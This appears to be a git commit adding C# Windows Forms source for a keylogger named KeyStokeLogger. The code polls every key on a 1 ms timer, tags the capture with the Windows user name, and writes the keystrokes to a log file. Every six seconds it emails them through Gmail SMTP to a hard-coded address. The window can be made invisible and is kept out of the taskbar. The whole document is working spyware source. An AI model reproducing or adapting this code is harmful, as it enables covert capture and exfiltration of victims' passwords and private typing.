f8dab4340dfc2141d31ae17f3e883221fdb8d2ff
kuharan <kuharan@HOME>
2017-12-18 14:08:55 +0530

    Add project files.

---
+++ Keylogger1/Form1.Designer.cs
@@ -0,0 +1,154 @@
+﻿namespace KeyStokeLogger
+{
+    partial class InitalForm
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(InitalForm));
+            this.button1 = new System.Windows.Forms.Button();
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.key = new System.Windows.Forms.Timer(this.components);
+            this.log = new System.Windows.Forms.Timer(this.components);
+            this.button2 = new System.Windows.Forms.Button();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.button3 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button1.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(29, 25);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(98, 80);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "START";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.Start_Click);
+            // 
+            // notifyIcon1
+            // 
+            this.notifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
+            this.notifyIcon1.BalloonTipText = ".";
+            this.notifyIcon1.BalloonTipTitle = ".";
+            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
+            this.notifyIcon1.Visible = true;
+            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
+            // 
+            // key
+            // 
+            this.key.Enabled = true;
+            this.key.Interval = 1;
+            this.key.Tick += new System.EventHandler(this.key_Tick);
+            // 
+            // log
+            // 
+            this.log.Interval = 1;
+            this.log.Tick += new System.EventHandler(this.log_Tick);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button2.Location = new System.Drawing.Point(29, 140);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(98, 60);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "STOP";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.StopButton_Click);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(339, 13);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(445, 237);
+            this.richTextBox1.TabIndex = 2;
+            this.richTextBox1.Text = "";
+            // 
+            // button3
+            // 
+            this.button3.BackColor = System.Drawing.SystemColors.ActiveBorder;
+            this.button3.Location = new System.Drawing.Point(150, 25);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(132, 64);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "SEND BY MAIL";
+            this.button3.UseVisualStyleBackColor = false;
+            this.button3.Click += new System.EventHandler(this.MailButton_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(45, 222);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(35, 13);
+            this.label1.TabIndex = 5;
+            this.label1.Text = "label1";
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Interval = 6000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // InitalForm
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(796, 261);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.MaximumSize = new System.Drawing.Size(812, 300);
+            this.Name = "InitalForm";
+            this.ShowInTaskbar = false;
+            this.Text = "InitalForm";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.Timer key;
+        private System.Windows.Forms.Timer log;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
+
---
+++ Keylogger1/Form1.cs
@@ -0,0 +1,385 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+
+namespace KeyStokeLogger
+{
+    public partial class InitalForm : Form
+    {
+        public InitalForm()
+        {
+            InitializeComponent();
+        }
+
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
+
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(System.Int32 vKey);
+        StringBuilder keyBuffer;
+        
+        string data = "";
+        
+        void CreateLog(string file)
+        {
+            try
+            {
+                StreamWriter sw = new StreamWriter(file, true);
+                
+                sw.Write(keyBuffer.ToString());
+                sw.Write(data.ToString());
+                sw.Close();
+                keyBuffer.Clear();
+            }
+            catch
+            {
+            }
+        }
+
+        private void Start_Click(object sender, EventArgs e)
+        {
+            this.Opacity = 100;
+            key.Enabled = true;
+            log.Enabled = true;
+            notifyIcon1.ShowBalloonTip(5000);
+            button2.Enabled = true;
+            button1.Enabled = false;
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            this.Opacity = 0;
+        }
+
+        string msg = "";
+        bool capslock, numlock;
+
+        private void key_Tick(object sender, EventArgs e)
+        {
+            capslock = Console.CapsLock;
+            numlock = Console.NumberLock;
+            if (capslock == true)
+            {
+                //button1.Text = "On";
+            }
+            foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) 
+            {
+                if (GetAsyncKeyState(i) == -32767)   
+                {
+                    msg = Enum.GetName(typeof(Keys), i).ToString();
+                    if (capslock == true)
+                    {
+                        msg = msg.ToUpper();
+                    }
+                    else
+                        msg=msg.ToLower();
+                    switch (msg)
+                    {
+                        case "space":case "SPACE":
+                            msg = " ";
+                            break;
+                        case "capslock":
+                        case "CAPSLOCK":
+                            msg = " ";
+                            break;
+
+                      //  shiftkeylshiftkey
+                        case "enter":case "ENTER":
+                            msg=(Environment.NewLine);
+                            break;
+                           
+                        case "LBUTTON": case "lbutton":
+                            msg = "";
+                            break;
+                        case "OemPeriod":case "OEMPERIOD":case "oemperiod":
+                            msg=".";
+                            break;
+
+                        case "LMenu":case "lemnu":case "LMENU":
+                            msg="ALT ";
+                            break;
+                        case "Back":
+                            msg = " ";
+                            break;
+
+                        case "Oem7":
+                            msg="'";
+                            break;
+                        case "down":
+                            msg = " D ";
+                            break;
+                        case "up":
+                            msg = " U ";
+                            break;
+                        case "right":
+                            msg = " R ";
+                            break;
+                        case "left":
+                            msg = " L ";
+                            break;
+                        case "back":
+                            msg = " B ";
+                            break;
+                        case "Oemcomma":
+                            msg=",";
+                            break;
+                        case "Capital":
+                            msg="CAPITAL ";
+                            break;
+                        case "Tab":
+                            msg="TAB ";
+                            break;
+                        case "OemQuestion":
+                            msg="?";
+                            break;
+                        case "Oem1":
+                            msg=";";
+                            break;
+                        case "Oem5":
+                            msg="\\";
+                            break;
+                        case "Oem6":
+                            msg="]";
+                            break;
+                        case "OemOpenBrackets":
+                            msg="[";
+                            break;
+                        case "OemMinus":
+                            msg="-";
+                            break;
+                        case "Oemplus":
+                            msg="+";
+                            break;
+                        /*case Keys.Down:
+                            sw.Write("DownArrow-");
+                            break;
+                        case Keys.Left:
+                            sw.Write("Left Arrow-");
+                            break;
+                        case Keys.Right:
+                            sw.Write("Righr Arrow-");
+                            break;
+                        case Keys.Up:
+                            sw.Write("Up Arrow-");
+                            break;*/
+                        case "D0":
+                        case "d0":
+                            msg="0";
+                            break;
+                        case "D1":
+                        case "d1":
+                            msg="1";
+                            break;
+                        case "D2":
+                        case "d2":
+                            msg="2";
+                            break;
+                        case "D3":
+                        case "d3":
+                            msg="3";
+                            break;
+                        case "D4":
+                        case "d4":
+                            msg="4";
+                            break;
+                        case "D5":
+                        case "d5":
+                            msg="5";
+                            break;
+                        case "D6":
+                        case "d6":
+                            msg="6";
+                            break;
+                        case "D7":
+                        case "d7":
+                            msg="7";
+                            break;
+                        case "D8":
+                        case "d8":
+                            msg="8";
+                            break;
+                        case "D9":
+                        case "d9":
+                            msg="9";
+                            break;
+                        case "OemPipe":
+                            msg = "|";
+                            break;
+                        case "rshiftkey":
+                        case "RShiftKey":
+                        case "RSHIFTKEY":
+                            msg = "";
+                            break;
+                        case "LSHIFTKEY":
+                       case "Lshiftkey":
+                       case "lshiftkey":
+                            msg = "";
+                            break;
+
+                       case "LCONTROLKEY":
+                       case "lcontrolkey":
+                            msg = "";
+                            break;
+                       case "RCONTROLKEY":
+                       case "rcontrolkey":
+                            msg = "";
+                            break;
+
+                            case "OemSemicolon":
+                            msg=";";
+                            break;
+                        case "DELETE":case "delete":
+                            msg = "";
+                            break;
+                        //case "DELETE":
+                        //case "delete":
+                          //  msg = "";
+                            //break;
+                    }
+                    
+                    if (msg.Contains("control") || msg.Contains("CONTROL")) try { msg = msg.Substring("CONTROL".Length, msg.Length); ctrl = 2; }
+                        catch { msg = ""; ctrl = 2; }
+                    if (msg.Contains("shift") || msg.Contains("SHIFT")) try { msg = msg.Substring("SHIFT".Length, msg.Length); shift = 3; }
+                        catch { msg = ""; shift = 3; }
+
+                    if (msg.Equals("delete") || msg.Equals("DELETE")) del = 2;
+                    if(msg.Equals("back")||msg.Equals("BACK"))back=3;
+
+                    if (shift == 1)
+                    {
+                        try
+                        {
+                            a = Convert.ToChar(msg);
+                            shift = 0;
+                            
+                        }catch{}
+
+                        if (capslock == true)
+                        {
+                            sp = Convert.ToInt32(a) + 32;
+                            try { ab = Convert.ToChar(sp); }
+                            catch { MessageBox.Show(sp.ToString()); }
+                            msg = ab.ToString(); shift = 0;
+                        }
+                        else
+                        {   
+                           msg = msg.ToString().ToUpper();
+                           sp = Convert.ToInt32(a) - 32;
+                           try { ab = Convert.ToChar(sp); }
+                           catch { MessageBox.Show(sp.ToString()); }
+                           msg = ab.ToString(); shift = 0;
+                        }
+                        label1.Text = shift.ToString() + "  " + msg.ToString();
+                        richTextBox1.Text += msg;
+                        
+                        shift = 0;
+                    }
+                    else
+                    {
+                     if(shift>= 2)shift--;
+                        keyBuffer.Append(msg);
+                        label1.Text = shift.ToString() + "  " + msg.ToString();
+                        richTextBox1.Text += msg;
+                    }
+                }
+            }		
+        }
+        int ctrl, shift, del,back = 0; int sp; string msg2; char a,ab;
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.Opacity = 100;
+            key.Enabled = true;
+            log.Enabled = true;
+            notifyIcon1.ShowBalloonTip(5000);
+            button2.Enabled = true;
+            button1.Enabled = false;
+            
+            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            richTextBox1.Text += userName + "     :    ";
+            keyBuffer = new StringBuilder();
+            smtpClient= "smtp.gmail.com";
+            smtpPort = "587";
+            mailfrom= "kuharan.bhowmik@gmail.com"; //ONLY GMAIL ALLOWED
+
+        }
+
+        string smtpClient, smtpPort, mailfrom;
+
+        public void sendMail1()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                mail.From = new MailAddress(mailfrom);
+                mail.To.Add(new MailAddress("kuharan.bhowmik@gmail.com"));
+                mail.Body = richTextBox1.Text;
+
+                SmtpClient Smtp_Client = new SmtpClient("smtp.gmail.com", 587);
+                Smtp_Client.EnableSsl = true;
+                Smtp_Client.Credentials = new NetworkCredential(mailfrom, "YOUR-EMAIL-1-PASSWORD"); ;
+
+                Smtp_Client.SendCompleted += new SendCompletedEventHandler(smtp_SendCompleted);
+                Smtp_Client.SendAsync(mail, null);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+        }
+
+        private void smtp_SendCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
+        {
+            if (e.Error != null) { }
+            else if (e.Cancelled) { }
+            else
+            { }
+        }
+        private void sendMail()
+        {
+            try
+            {
+                SmtpClient client = new SmtpClient(smtpClient);
+                MailMessage message = new MailMessage(mailfrom, "YOUR EMAIL @gmail.com");
+                message.Body = richTextBox1.Text;
+                message.Subject = "KeyStrokeLogger";
+                client.Credentials = new System.Net.NetworkCredential(mailfrom, "YOUR EMAIL PASSWORD");
+                client.Port = Convert.ToInt32(smtpPort);
+                client.Send(message);
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+        private void log_Tick(object sender, EventArgs e)
+        {
+            CreateLog(@"E:\\KeyStrokesEntered.txt");
+            //Console.WriteLine("Log File Created");
+        }
+        private void StopButton_Click(object sender, EventArgs e)
+        {
+            key.Enabled = false;
+            log.Enabled = false;
+            button1.Enabled = true;
+            button2.Enabled = false;            
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+           sendMail1();
+        }
+
+        private void MailButton_Click(object sender, EventArgs e)
+        {
+            sendMail1();
+        }
+    }
+}
